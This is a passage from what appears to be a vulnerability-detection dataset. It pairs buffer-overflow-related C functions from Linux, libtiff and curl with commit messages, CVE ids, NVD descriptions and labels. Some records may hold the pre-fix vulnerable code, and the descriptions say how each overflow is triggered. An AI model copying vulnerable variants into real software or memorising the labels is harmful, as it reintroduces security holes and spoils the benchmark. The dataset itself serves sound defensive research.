CFG_CNF_MCAST_RX:\n\t\t\t\tcase CFG_CNF_MAX_SLEEP_DURATION:\n\t\t\t\tcase CFG_CNF_HOLDOVER_DURATION:\n\t\t\t\tcase CFG_CNF_OWN_NAME:\n\t\t\t\tcase CFG_CNF_LOAD_BALANCING:\n\t\t\t\tcase CFG_CNF_MEDIUM_DISTRIBUTION:\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_TX_POW_LVL:\n\t\t\t\tcase CFG_CNF_CONNECTION_CNTL:\n\t\t\t\t/*case CFG_PROBE_DATA_RATE: */\n#endif /* HERMES25 */\n#if 1 /*;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/*;?should we restore this to allow smaller memory footprint */\n\t\t\t\tcase CFG_CNF_OWN_DTIM_PERIOD:\n#ifdef WARP\n\t\t\t\tcase CFG_CNF_OWN_BEACON_INTERVAL:                    /* Own Beacon Interval */\n#endif /* WARP */\n#ifdef USE_WDS\n\t\t\t\tcase CFG_CNF_WDS_ADDR1:\n\t\t\t\tcase CFG_CNF_WDS_ADDR2:\n\t\t\t\tcase CFG_CNF_WDS_ADDR3:\n\t\t\t\tcase CFG_CNF_WDS_ADDR4:\n\t\t\t\tcase CFG_CNF_WDS_ADDR5:\n\t\t\t\tcase CFG_CNF_WDS_ADDR6:\n#endif\n\t\t\t\tcase CFG_CNF_MCAST_PM_BUF:\n\t\t\t\tcase CFG_CNF_REJECT_ANY:\n#endif\n\n\t\t\t\tcase CFG_CNF_ENCRYPTION:\n\t\t\t\tcase CFG_CNF_AUTHENTICATION:\n#if 1 /* ;? (HCF_TYPE) & HCF_TYPE_AP */\n\t\t/* ;?should we restore this to allow smaller memory footprint */\n\n\t\t\t\tcase CFG_CNF_EXCL_UNENCRYPTED:\n\t\t\t\tcase CFG_CNF_MCAST_RATE:\n\t\t\t\tcase CFG_CNF_INTRA_BSS_RELAY:\n#endif\n\n\t\t\t\tcase CFG_CNF_MICRO_WAVE:\n\t\t\t\t/* case CFG_CNF_LOAD_BALANCING: */\n\t\t\t\t/* case CFG_CNF_MEDIUM_DISTRIBUTION: */\n\t\t\t\t/* case CFG_CNF_RX_ALL_GROUP_ADDRESS: */\n\t\t\t\t/* case CFG_CNF_COUNTRY_INFO: */\n\t\t\t\t/* case CFG_COUNTRY_STRING: */\n\t\t\t\tcase CFG_AP_MODE:\n\t\t\t\tcase CFG_ENCRYPT_STRING:\n\t\t\t\t/* case CFG_DRIVER_ENABLE: */\n\t\t\t\tcase CFG_WOLAS_ENABLE:\n\t\t\t\tcase CFG_MB_INFO:\n\t\t\t\tcase CFG_IFB:\n\t\t\t\t\tbreak;\n\t\t\t\t/* Deal with this dynamic MSF RID, as it's required for WPA */\n\t\t\t\tcase CFG_DRIVER_ENABLE:\n\t\t\t\t\tif (lp->driverEnable) {\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_ENABLE | HCF_PORT_0);\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_CONNECT);\n\t\t\t\t\t} else {\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_DISABLE | HCF_PORT_0);\n\t\t\t\t\t\thcf_cntl(&(lp->hcfCtx), HCF_CNTL_DISCONNECT);\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\twl_act_int_off(lp);\n\t\t\t\t\turq->result = hcf_put_info(&(lp->hcfCtx), (LTVP) pLtv);\n\t\t\t\t\twl_act_int_on(lp);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tif (ltvAllocated)\n\t\t\t\t\tkfree(pLtv);\n\t\t\t} else {\n\t\t\t\turq->result = UIL_FAILURE;\n\t\t\t}\n\t\t} else {\n\t\t\tDBG_ERROR(DbgInfo, \"EPERM\\n\");\n\t\t\turq->result = UIL_FAILURE;\n\t\t\tresult = -EPERM;\n\t\t}\n\t} else {\n\t\tDBG_ERROR(DbgInfo, \"UIL_ERR_WRONG_IFB\\n\");\n\t\turq->result = UIL_ERR_WRONG_IFB;\n\t}\n\n\tDBG_LEAVE(DbgInfo);\n\treturn result;\n} /* wvlan_uil_put_info */\n", "func_hash": 43124070682619750693845041266416359812, "file_name": "wl_priv.c", "file_hash": 60757582669243507829230314014987153993, "cwe": ["CWE-119"], "cve": "CVE-2013-4514", "cve_desc": "Multiple buffer overflows in drivers/staging/wlags49_h2/wl_priv.c in the Linux kernel before 3.12 allow local users to cause a denial of service or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability and providing a long station-name string, related to the (1) wvlan_uil_put_info and (2) wvlan_set_station_nickname functions.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4514"}
{"idx": 158763, "project": "linux", "commit_id": "c2c65cd2e14ada6de44cb527e7f1990bede24e15", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c2c65cd2e14ada6de44cb527e7f1990bede24e15", "commit_message": "staging: ozwpan: prevent overflow in oz_cdev_write()\n\nWe need to check \"count\" so we don't overflow the ei->data buffer.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>", "target": 0, "func": "static ssize_t oz_cdev_write(struct file *filp, const char __user *buf,\n\t\tsize_t count, loff_t *fpos)\n{\n\tstruct oz_pd *pd;\n\tstruct oz_elt_buf *eb;\n\tstruct oz_elt_info *ei;\n\tstruct oz_elt *elt;\n \tstruct oz_app_hdr *app_hdr;\n \tstruct oz_serial_ctx *ctx;\n \n\tif (count > sizeof(ei->data) - sizeof(*elt) - sizeof(*app_hdr))\n\t\treturn -EINVAL;\n\n \tspin_lock_bh(&g_cdev.lock);\n \tpd = g_cdev.active_pd;\n \tif (pd)\n\t\toz_pd_get(pd);\n\tspin_unlock_bh(&g_cdev.lock);\n\tif (pd == NULL)\n\t\treturn -ENXIO;\n\tif (!(pd->state & OZ_PD_S_CONNECTED))\n\t\treturn -EAGAIN;\n\teb = &pd->elt_buff;\n\tei = oz_elt_info_alloc(eb);\n\tif (ei == NULL) {\n\t\tcount = 0;\n\t\tgoto out;\n\t}\n\telt = (struct oz_elt *)ei->data;\n\tapp_hdr = (struct oz_app_hdr *)(elt+1);\n\telt->length = sizeof(struct oz_app_hdr) + count;\n\telt->type = OZ_ELT_APP_DATA;\n\tei->app_id = OZ_APPID_SERIAL;\n\tei->length = elt->length + sizeof(struct oz_elt);\n\tapp_hdr->app_id = OZ_APPID_SERIAL;\n\tif (copy_from_user(app_hdr+1, buf, count))\n\t\tgoto out;\n\tspin_lock_bh(&pd->app_lock[OZ_APPID_USB-1]);\n\tctx = (struct oz_serial_ctx *)pd->app_ctx[OZ_APPID_SERIAL-1];\n\tif (ctx) {\n\t\tapp_hdr->elt_seq_num = ctx->tx_seq_num++;\n\t\tif (ctx->tx_seq_num == 0)\n\t\t\tctx->tx_seq_num = 1;\n\t\tspin_lock(&eb->lock);\n\t\tif (oz_queue_elt_info(eb, 0, 0, ei) == 0)\n\t\t\tei = NULL;\n\t\tspin_unlock(&eb->lock);\n\t}\n\tspin_unlock_bh(&pd->app_lock[OZ_APPID_USB-1]);\nout:\n\tif (ei) {\n\t\tcount = 0;\n\t\tspin_lock_bh(&eb->lock);\n\t\toz_elt_info_free(eb, ei);\n\t\tspin_unlock_bh(&eb->lock);\n\t}\n\toz_pd_put(pd);\n\treturn count;\n}\n", "func_hash": 268989265383617722739012115893286768042, "file_name": "ozcdev.c", "file_hash": 237028343997351835750824134302673251173, "cwe": ["CWE-119"], "cve": "CVE-2013-4513", "cve_desc": "Buffer overflow in the oz_cdev_write function in drivers/staging/ozwpan/ozcdev.c in the Linux kernel before 3.12 allows local users to cause a denial of service or possibly have unspecified other impact via a crafted write operation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4513"}
{"idx": 158803, "project": "libtiff", "commit_id": "ce6841d9e41d621ba23cf18b190ee6a23b2cc833", "project_url": "https://github.com/vadz/libtiff", "commit_url": "https://github.com/vadz/libtiff/commit/ce6841d9e41d621ba23cf18b190ee6a23b2cc833", "commit_message": "fix possible OOB write in gif2tiff.c", "target": 0, "func": "process(register int code, unsigned char** fill)\n{\n    int incode;\n    static unsigned char firstchar;\n\n    if (code == clear) {\n\tcodesize = datasize + 1;\n\tcodemask = (1 << codesize) - 1;\n\tavail = clear + 2;\n\toldcode = -1;\n\treturn 1;\n     }\n \n     if (oldcode == -1) {\n        if (code >= clear) {\n            fprintf(stderr, \"bad input: code=%d is larger than clear=%d\\n\",code, clear);\n            return 0;\n        }\n \t*(*fill)++ = suffix[code];\n \tfirstchar = oldcode = code;\n \treturn 1;\n    }\n    if (code > avail) {\n\tfprintf(stderr, \"code %d too large for %d\\n\", code, avail);\n\treturn 0; \n    }\n\n    incode = code;\n    if (code == avail) {      /* the first code is always < avail */\n\t*stackp++ = firstchar;\n\tcode = oldcode;\n    }\n    while (code > clear) {\n\t*stackp++ = suffix[code];\n\tcode = prefix[code];\n    }\n\n    *stackp++ = firstchar = suffix[code];\n    prefix[avail] = oldcode;\n    suffix[avail] = firstchar;\n    avail++;\n\n    if (((avail & codemask) == 0) && (avail < 4096)) {\n\tcodesize++;\n\tcodemask += avail;\n    }\n    oldcode = incode;\n    do {\n\t*(*fill)++ = *--stackp;\n    } while (stackp > stack);\n    return 1;\n}\n", "func_hash": 326773067396447758615241658626241255256, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-4244", "cve_desc": "The LZW decompressor in the gif2tiff tool in libtiff 4.0.3 and earlier allows context-dependent attackers to cause a denial of service (out-of-bounds write and crash) or possibly execute arbitrary code via a crafted GIF image.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-4244"}
{"idx": 158823, "project": "linux", "commit_id": "cea4dcfdad926a27a18e188720efe0f2c9403456", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/cea4dcfdad926a27a18e188720efe0f2c9403456", "commit_message": "iscsi-target: fix heap buffer overflow on error\n\nIf a key was larger than 64 bytes, as checked by iscsi_check_key(), the\nerror response packet, generated by iscsi_add_notunderstood_response(),\nwould still attempt to copy the entire key into the packet, overflowing\nthe structure on the heap.\n\nRemote preauthentication kernel memory corruption was possible if a\ntarget was configured and listening on the network.\n\nCVE-2013-2850\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org\nSigned-off-by: Nicholas Bellinger <nab@linux-iscsi.org>", "target": 0, "func": "static int iscsi_add_notunderstood_response(\n\tchar *key,\n\tchar *value,\n\tstruct iscsi_param_list *param_list)\n{\n\tstruct iscsi_extra_response *extra_response;\n\n\tif (strlen(value) > VALUE_MAXLEN) {\n\t\tpr_err(\"Value for notunderstood key \\\"%s\\\" exceeds %d,\"\n\t\t\t\" protocol error.\\n\", key, VALUE_MAXLEN);\n\t\treturn -1;\n\t}\n\n\textra_response = kzalloc(sizeof(struct iscsi_extra_response), GFP_KERNEL);\n\tif (!extra_response) {\n\t\tpr_err(\"Unable to allocate memory for\"\n\t\t\t\" struct iscsi_extra_response.\\n\");\n\t\treturn -1;\n \t}\n \tINIT_LIST_HEAD(&extra_response->er_list);\n \n\tstrlcpy(extra_response->key, key, sizeof(extra_response->key));\n\tstrlcpy(extra_response->value, NOTUNDERSTOOD,\n\t\tsizeof(extra_response->value));\n \n \tlist_add_tail(&extra_response->er_list,\n \t\t\t&param_list->extra_response_list);\n\treturn 0;\n}\n", "func_hash": 336700731731125479647078589036761925390, "file_name": "iscsi_target_parameters.c", "file_hash": 260263344392188792862342421589644819959, "cwe": ["CWE-119"], "cve": "CVE-2013-2850", "cve_desc": "Heap-based buffer overflow in the iscsi_add_notunderstood_response function in drivers/target/iscsi/iscsi_target_parameters.c in the iSCSI target subsystem in the Linux kernel through 3.9.4 allows remote attackers to cause a denial of service (memory corruption and OOPS) or possibly execute arbitrary code via a long key that is not properly handled during construction of an error-response packet.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2850"}
{"idx": 158839, "project": "curl", "commit_id": "192c4f788d48f82c03e9cef40013f34370e90737", "project_url": "https://github.com/curl/curl", "commit_url": "https://github.com/bagder/curl/commit/192c4f788d48f82c03e9cef40013f34370e90737", "commit_message": "Curl_urldecode: no peeking beyond end of input buffer\n\nSecurity problem: CVE-2013-2174\n\nIf a program would give a string like \"%FF\" to curl_easy_unescape() but\nask for it to decode only the first byte, it would still parse and\ndecode the full hex sequence. The function then not only read beyond the\nallowed buffer but it would also deduct the *unsigned* counter variable\nfor how many more bytes there's left to read in the buffer by two,\nmaking the counter wrap. Continuing this, the function would go on\nreading beyond the buffer and soon writing beyond the allocated target\nbuffer...\n\nBug: http://curl.haxx.se/docs/adv_20130622.html\nReported-by: Timo Sirainen", "target": 0, "func": "CURLcode Curl_urldecode(struct SessionHandle *data,\n                        const char *string, size_t length,\n                        char **ostring, size_t *olen,\n                        bool reject_ctrl)\n{\n  size_t alloc = (length?length:strlen(string))+1;\n  char *ns = malloc(alloc);\n  unsigned char in;\n  size_t strindex=0;\n  unsigned long hex;\n  CURLcode res;\n\n  if(!ns)\n    return CURLE_OUT_OF_MEMORY;\n \n   while(--alloc > 0) {\n     in = *string;\n    if(('%' == in) && (alloc > 2) &&\n       ISXDIGIT(string[1]) && ISXDIGIT(string[2])) {\n       /* this is two hexadecimal digits following a '%' */\n       char hexstr[3];\n       char *ptr;\n      hexstr[0] = string[1];\n      hexstr[1] = string[2];\n      hexstr[2] = 0;\n\n      hex = strtoul(hexstr, &ptr, 16);\n\n      in = curlx_ultouc(hex); /* this long is never bigger than 255 anyway */\n\n      res = Curl_convert_from_network(data, &in, 1);\n      if(res) {\n        /* Curl_convert_from_network calls failf if unsuccessful */\n        free(ns);\n        return res;\n      }\n\n      string+=2;\n      alloc-=2;\n    }\n    if(reject_ctrl && (in < 0x20)) {\n      free(ns);\n      return CURLE_URL_MALFORMAT;\n    }\n\n    ns[strindex++] = in;\n    string++;\n  }\n  ns[strindex]=0; /* terminate it */\n\n  if(olen)\n    /* store output size */\n    *olen = strindex;\n\n  if(ostring)\n    /* store output string */\n    *ostring = ns;\n\n  return CURLE_OK;\n}\n", "func_hash": 261717292064389369875559982566734886220, "file_name": "escape.c", "file_hash": 33651401652734190625226617558219220221, "cwe": ["CWE-119"], "cve": "CVE-2013-2174", "cve_desc": "Heap-based buffer overflow in the curl_easy_unescape function in lib/escape.c in cURL and libcurl 7.7 through 7.30.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted string ending in a \"%\" (percent) character.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2174"}
{"idx": 158841, "project": "linux", "commit_id": "baff42ab1494528907bf4d5870359e31711746ae", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/baff42ab1494528907bf4d5870359e31711746ae", "commit_message": "net: Fix oops from tcp_collapse() when using splice()\n\ntcp_read_sock() can have a eat skbs without immediately advancing copied_seq.\nThis can cause a panic in tcp_collapse() if it is called as a result\nof the recv_actor dropping the socket lock.\n\nA userspace program that splices data from a socket to either another\nsocket or to a file can trigger this bug.\n\nSigned-off-by: Steven J. Magnani <steve@digidescorp.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "int tcp_read_sock(struct sock *sk, read_descriptor_t *desc,\n\t\t  sk_read_actor_t recv_actor)\n{\n\tstruct sk_buff *skb;\n\tstruct tcp_sock *tp = tcp_sk(sk);\n\tu32 seq = tp->copied_seq;\n\tu32 offset;\n\tint copied = 0;\n\n\tif (sk->sk_state == TCP_LISTEN)\n\t\treturn -ENOTCONN;\n\twhile ((skb = tcp_recv_skb(sk, seq, &offset)) != NULL) {\n\t\tif (offset < skb->len) {\n\t\t\tint used;\n\t\t\tsize_t len;\n\n\t\t\tlen = skb->len - offset;\n\t\t\t/* Stop reading if we hit a patch of urgent data */\n\t\t\tif (tp->urg_data) {\n\t\t\t\tu32 urg_offset = tp->urg_seq - seq;\n\t\t\t\tif (urg_offset < len)\n\t\t\t\t\tlen = urg_offset;\n\t\t\t\tif (!len)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tused = recv_actor(desc, skb, offset, len);\n\t\t\tif (used < 0) {\n\t\t\t\tif (!copied)\n\t\t\t\t\tcopied = used;\n\t\t\t\tbreak;\n\t\t\t} else if (used <= len) {\n\t\t\t\tseq += used;\n\t\t\t\tcopied += used;\n\t\t\t\toffset += used;\n\t\t\t}\n\t\t\t/*\n\t\t\t * If recv_actor drops the lock (e.g. TCP splice\n\t\t\t * receive) the skb pointer might be invalid when\n\t\t\t * getting here: tcp_collapse might have deleted it\n\t\t\t * while aggregating skbs from the socket queue.\n\t\t\t */\n\t\t\tskb = tcp_recv_skb(sk, seq-1, &offset);\n\t\t\tif (!skb || (offset+1 != skb->len))\n\t\t\t\tbreak;\n\t\t}\n\t\tif (tcp_hdr(skb)->fin) {\n\t\t\tsk_eat_skb(sk, skb, 0);\n\t\t\t++seq;\n\t\t\tbreak;\n\t\t}\n \t\tsk_eat_skb(sk, skb, 0);\n \t\tif (!desc->count)\n \t\t\tbreak;\n\t\ttp->copied_seq = seq;\n \t}\n \ttp->copied_seq = seq;\n \n\ttcp_rcv_space_adjust(sk);\n\n\t/* Clean up data we have read: This will do ACK frames. */\n\tif (copied > 0)\n\t\ttcp_cleanup_rbuf(sk, copied);\n\treturn copied;\n}\n", "func_hash": 67110211699949058892652822621683468458, "file_name": "tcp.c", "file_hash": 163710130416565722142518083502942354011, "cwe": ["CWE-119"], "cve": "CVE-2013-2128", "cve_desc": "The tcp_read_sock function in net/ipv4/tcp.c in the Linux kernel before 2.6.34 does not properly manage skb consumption, which allows local users to cause a denial of service (system crash) via a crafted splice system call for a TCP socket.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2128"}
{"idx": 158843, "project": "linux", "commit_id": "929473ea05db455ad88cdc081f2adc556b8dc48f", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/929473ea05db455ad88cdc081f2adc556b8dc48f", "commit_message": "usb: chipidea: Allow disabling streaming not only in udc mode\n\nWhen running a scp transfer using a USB/Ethernet adapter the following crash\nhappens:\n\n$ scp test.tar.gz fabio@192.168.1.100:/home/fabio\nfabio@192.168.1.100's password:\ntest.tar.gz                                      0%    0     0.0KB/s   --:-- ETA\n------------[ cut here ]------------\nWARNING: at net/sched/sch_generic.c:255 dev_watchdog+0x2cc/0x2f0()\nNETDEV WATCHDOG: eth0 (asix): transmit queue 0 timed out\nModules linked in:\nBacktrace:\n[<80011c94>] (dump_backtrace+0x0/0x10c) from [<804d3a5c>] (dump_stack+0x18/0x1c)\n r6:000000ff r5:80412388 r4:80685dc0 r3:80696cc0\n[<804d3a44>] (dump_stack+0x0/0x1c) from [<80021868>]\n(warn_slowpath_common+0x54/0x6c)\n[<80021814>] (warn_slowpath_common+0x0/0x6c) from [<80021924>]\n(warn_slowpath_fmt+0x38/0x40)\n...\n\nSetting SDIS (Stream Disable Mode- bit 4 of USBMODE register) fixes the problem.\n\nHowever, in current code CI13XXX_DISABLE_STREAMING flag is only set in udc mode,\nso allow disabling streaming also in host mode.\n\nTested on a mx6qsabrelite board.\n\nSuggested-by: Peter Chen <peter.chen@freescale.com>\nSigned-off-by: Fabio Estevam <fabio.estevam@freescale.com>\nReviewed-by: Peter Chen <peter.chen@freescale.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 0, "func": "static int host_start(struct ci13xxx *ci)\n{\n\tstruct usb_hcd *hcd;\n\tstruct ehci_hcd *ehci;\n\tint ret;\n\n\tif (usb_disabled())\n\t\treturn -ENODEV;\n\n\thcd = usb_create_hcd(&ci_ehci_hc_driver, ci->dev, dev_name(ci->dev));\n\tif (!hcd)\n\t\treturn -ENOMEM;\n\n\tdev_set_drvdata(ci->dev, ci);\n\thcd->rsrc_start = ci->hw_bank.phys;\n\thcd->rsrc_len = ci->hw_bank.size;\n\thcd->regs = ci->hw_bank.abs;\n\thcd->has_tt = 1;\n\n\thcd->power_budget = ci->platdata->power_budget;\n\thcd->phy = ci->transceiver;\n\n\tehci = hcd_to_ehci(hcd);\n\tehci->caps = ci->hw_bank.cap;\n\tehci->has_hostpc = ci->hw_bank.lpm;\n\n\tret = usb_add_hcd(hcd, 0, 0);\n\tif (ret)\n\t\tusb_put_hcd(hcd);\n \telse\n \t\tci->hcd = hcd;\n \n\tif (ci->platdata->flags & CI13XXX_DISABLE_STREAMING)\n\t\thw_write(ci, OP_USBMODE, USBMODE_CI_SDIS, USBMODE_CI_SDIS);\n\n \treturn ret;\n }\n", "func_hash": 202703564392681680115241017045440672641, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2013-2058", "cve_desc": "The host_start function in drivers/usb/chipidea/host.c in the Linux kernel before 3.7.4 does not properly support a certain non-streaming option, which allows local users to cause a denial of service (system crash) by sending a large amount of network traffic through a USB/Ethernet adapter.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-2058"}
{"idx": 158853, "project": "linux", "commit_id": "715230a44310a8cf66fbfb5a46f9a62a9b2de424", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/715230a44310a8cf66fbfb5a46f9a62a9b2de424", "commit_message": "tg3: fix length overflow in VPD firmware parsing\n\nCommit 184b89044fb6e2a74611dafa69b1dce0d98612c6 (\"tg3: Use VPD fw version\nwhen present\") introduced VPD parsing that contained a potential length\noverflow.\n\nLimit the hardware's reported firmware string length (max 255 bytes) to\nstay inside the driver's firmware string length (32 bytes). On overflow,\ntruncate the formatted firmware string instead of potentially overwriting\nportions of the tg3 struct.\n\nhttp://cansecwest.com/slides/2013/PrivateCore%20CSW%202013.pdf\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nReported-by: Oded Horovitz <oded@privatecore.com>\nReported-by: Brad Spengler <spender@grsecurity.net>\nCc: stable@vger.kernel.org\nCc: Matt Carlson <mcarlson@broadcom.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>", "target": 0, "func": "static void tg3_read_vpd(struct tg3 *tp)\n{\n\tu8 *vpd_data;\n\tunsigned int block_end, rosize, len;\n\tu32 vpdlen;\n\tint j, i = 0;\n\n\tvpd_data = (u8 *)tg3_vpd_readblock(tp, &vpdlen);\n\tif (!vpd_data)\n\t\tgoto out_no_vpd;\n\n\ti = pci_vpd_find_tag(vpd_data, 0, vpdlen, PCI_VPD_LRDT_RO_DATA);\n\tif (i < 0)\n\t\tgoto out_not_found;\n\n\trosize = pci_vpd_lrdt_size(&vpd_data[i]);\n\tblock_end = i + PCI_VPD_LRDT_TAG_SIZE + rosize;\n\ti += PCI_VPD_LRDT_TAG_SIZE;\n\n\tif (block_end > vpdlen)\n\t\tgoto out_not_found;\n\n\tj = pci_vpd_find_info_keyword(vpd_data, i, rosize,\n\t\t\t\t      PCI_VPD_RO_KEYWORD_MFR_ID);\n\tif (j > 0) {\n\t\tlen = pci_vpd_info_field_size(&vpd_data[j]);\n\n\t\tj += PCI_VPD_INFO_FLD_HDR_SIZE;\n\t\tif (j + len > block_end || len != 4 ||\n\t\t    memcmp(&vpd_data[j], \"1028\", 4))\n\t\t\tgoto partno;\n\n\t\tj = pci_vpd_find_info_keyword(vpd_data, i, rosize,\n\t\t\t\t\t      PCI_VPD_RO_KEYWORD_VENDOR0);\n\t\tif (j < 0)\n\t\t\tgoto partno;\n\n\t\tlen = pci_vpd_info_field_size(&vpd_data[j]);\n\n\t\tj += PCI_VPD_INFO_FLD_HDR_SIZE;\n \t\tif (j + len > block_end)\n \t\t\tgoto partno;\n \n\t\tif (len >= sizeof(tp->fw_ver))\n\t\t\tlen = sizeof(tp->fw_ver) - 1;\n\t\tmemset(tp->fw_ver, 0, sizeof(tp->fw_ver));\n\t\tsnprintf(tp->fw_ver, sizeof(tp->fw_ver), \"%.*s bc \", len,\n\t\t\t &vpd_data[j]);\n \t}\n \n partno:\n\ti = pci_vpd_find_info_keyword(vpd_data, i, rosize,\n\t\t\t\t      PCI_VPD_RO_KEYWORD_PARTNO);\n\tif (i < 0)\n\t\tgoto out_not_found;\n\n\tlen = pci_vpd_info_field_size(&vpd_data[i]);\n\n\ti += PCI_VPD_INFO_FLD_HDR_SIZE;\n\tif (len > TG3_BPN_SIZE ||\n\t    (len + i) > vpdlen)\n\t\tgoto out_not_found;\n\n\tmemcpy(tp->board_part_number, &vpd_data[i], len);\n\nout_not_found:\n\tkfree(vpd_data);\n\tif (tp->board_part_number[0])\n\t\treturn;\n\nout_no_vpd:\n\tif (tg3_asic_rev(tp) == ASIC_REV_5717) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_5717 ||\n\t\t    tp->pdev->device == TG3PCI_DEVICE_TIGON3_5717_C)\n\t\t\tstrcpy(tp->board_part_number, \"BCM5717\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_5718)\n\t\t\tstrcpy(tp->board_part_number, \"BCM5718\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_57780) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57780)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57780\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57760)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57760\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57790)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57790\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57788)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57788\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_57765) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57761)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57761\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57765)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57765\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57781)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57781\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57785)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57785\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57791)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57791\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57795)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57795\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_57766) {\n\t\tif (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57762)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57762\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57766)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57766\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57782)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57782\");\n\t\telse if (tp->pdev->device == TG3PCI_DEVICE_TIGON3_57786)\n\t\t\tstrcpy(tp->board_part_number, \"BCM57786\");\n\t\telse\n\t\t\tgoto nomatch;\n\t} else if (tg3_asic_rev(tp) == ASIC_REV_5906) {\n\t\tstrcpy(tp->board_part_number, \"BCM95906\");\n\t} else {\nnomatch:\n\t\tstrcpy(tp->board_part_number, \"none\");\n\t}\n}\n", "func_hash": 339368621396240326813420275982009030986, "file_name": "tg3.c", "file_hash": 309569115333965795058510695340189645906, "cwe": ["CWE-119"], "cve": "CVE-2013-1929", "cve_desc": "Heap-based buffer overflow in the tg3_read_vpd function in drivers/net/ethernet/broadcom/tg3.c in the Linux kernel before 3.8.6 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via crafted firmware that specifies a long string in the Vital Product Data (VPD) data structure.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-1929"}
{"idx": 158855, "project": "linux", "commit_id": "c0f5ecee4e741667b2493c742b60b6218d40b3aa", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/c0f5ecee4e741667b2493c742b60b6218d40b3aa", "commit_message": "USB: cdc-wdm: fix buffer overflow\n\nThe buffer for responses must not overflow.\nIf this would happen, set a flag, drop the data and return\nan error after user space has read all remaining data.\n\nSigned-off-by: Oliver Neukum <oliver@neukum.org>\nCC: stable@kernel.org\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 0, "func": "static void wdm_in_callback(struct urb *urb)\n {\n \tstruct wdm_device *desc = urb->context;\n \tint status = urb->status;\n\tint length = urb->actual_length;\n \n \tspin_lock(&desc->iuspin);\n \tclear_bit(WDM_RESPONDING, &desc->flags);\n\n\tif (status) {\n\t\tswitch (status) {\n\t\tcase -ENOENT:\n\t\t\tdev_dbg(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -ENOENT\");\n\t\t\tgoto skip_error;\n\t\tcase -ECONNRESET:\n\t\t\tdev_dbg(&desc->intf->dev,\n\t\t\t\t\"nonzero urb status received: -ECONNRESET\");\n\t\t\tgoto skip_error;\n\t\tcase 